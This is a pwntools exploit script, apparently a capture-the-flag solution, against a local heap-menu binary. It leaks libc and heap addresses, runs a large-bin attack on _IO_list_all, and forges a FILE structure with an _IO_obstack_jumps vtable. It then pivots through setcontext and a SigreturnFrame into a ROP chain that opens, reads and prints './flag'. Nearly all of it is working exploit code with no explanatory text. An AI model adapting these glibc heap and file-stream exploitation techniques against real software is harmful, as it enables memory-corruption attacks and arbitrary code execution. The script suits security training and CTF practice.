from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))


add_chunk(0, 0x418)
add_chunk(1, 0x18)
add_chunk(2, 0x428)
add_chunk(3, 0x18)

delete_chunk(2)
delete_chunk(0)

show_chunk(2)
libc.address = u64(p.recvuntil('\x7F')[-6:].ljust(8, '\x00')) - (libc.sym['main_arena'] + 96)
info("libc base: " + hex(libc.address))

show_chunk(0)
heap_base = u64(p.recvuntil(('\x55', '\x56'))[-6:].ljust(8, '\x00')) & ~0xFFF
info("heap base: " + hex(heap_base))

add_chunk(0, 0x418)

edit_chunk(2, p64(0) * 3 + p64(libc.sym['_IO_list_all'] - 0x20))
delete_chunk(0)
add_chunk(0, 0x408)
edit_chunk(2, p64(libc.sym['main_arena'] + 1104) * 2 + p64(heap_base + 0x6d0) * 2)
add_chunk(2, 0x428)

file_addr = heap_base + 0x6d0
payload_addr = file_addr + 0x10
frame_addr = file_addr + 0xe8
rop_addr = frame_addr + 0xf8
buf_addr = rop_addr + 0x60

fake_file = b""
fake_file += p64(0)  # _IO_read_end
fake_file += p64(0)  # _IO_read_base
fake_file += p64(0)  # _IO_write_base
fake_file += p64(1)  # _IO_write_ptr
fake_file += p64(0)  # _IO_write_end
fake_file += p64(0)  # _IO_buf_base;
fake_file += p64(0)  # _IO_buf_end should usually be (_IO_buf_base + 1)
fake_file += p64(0) * 4  # from _IO_save_base to _markers
fake_file += p64(libc.search(asm('mov rdx, [rdi+0x8]; mov [rsp], rax; call qword ptr [rdx+0x20];'), executable=True).next())  # the FILE chain ptr
fake_file += p32(2)  # _fileno for stderr is 2
fake_file += p32(0)  # _flags2, usually 0
fake_file += p64(frame_addr)  # _old_offset, -1
fake_file += p16(1)  # _cur_column
fake_file += b"\x00"  # _vtable_offset
fake_file += b"\n"  # _shortbuf[1]
fake_file += p32(0)  # padding
fake_file += p64(libc.sym['_IO_2_1_stdout_'] + 0x1ea0)  # _IO_stdfile_1_lock
fake_file += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1
fake_file += p64(0)  # _codecvt, usually 0
fake_file += p64(0)  # _IO_wide_data_1
fake_file += p64(0) * 3  # from _freeres_list to __pad5
fake_file += p32(0xFFFFFFFF)  # _mode, usually -1
fake_file += b"\x00" * 19  # _unused2
fake_file = fake_file.ljust(0xD8 - 0x10, b'\x00')  # adjust to vtable
fake_file += p64(libc.sym['_IO_obstack_jumps'] + 0x20)  # fake vtable
fake_file += p64(file_addr + 0x30)

frame = SigreturnFrame()
frame.rdi = buf_addr
frame.rsi = 0
frame.rsp = rop_addr
frame.rip = libc.sym['open']

frame = bytearray(str(frame))
frame[8:8 + 8] = p64(frame_addr)
frame[0x20:0x20 + 8] = p64(libc.sym['setcontext'] + 61)
frame = str(frame)

rop = ''
rop += p64(libc.search(asm('pop rdi; ret;'), executable=True).next())
rop += p64(3)
rop += p64(libc.search(asm('pop rsi; ret;'), executable=True).next())
rop += p64(buf_addr)
rop += p64(libc.search(asm('pop rdx; pop r12; ret;'), executable=True).next())
rop += p64(0x100)
rop += p64(0)
rop += p64(libc.sym['read'])
rop += p64(libc.search(asm('pop rdi; ret;'), executable=True).next())
rop += p64(buf_addr)
rop += p64(libc.sym['puts'])

payload = ''
payload += fake_file
assert len(payload) <= frame_addr - payload_addr
payload = payload.ljust(frame_addr - payload_addr, '\x00')
payload += frame
assert len(payload) <= rop_addr - payload_addr
payload = payload.ljust(rop_addr - payload_addr, '\x00')
payload += rop
assert len(payload) <= buf_addr - payload_addr
payload = payload.ljust(buf_addr - payload_addr, '\x00')
payload += './flag\x00'
assert len(payload) <= 0x428

edit_chunk(2, payload)
edit_chunk(1, 'a' * 0x10 + p32(0xfbad1880))

gdb.attach(p, "b _obstack_newchunk\nc")
pause()

p.sendafter("choice:", "5")

p.interactive()
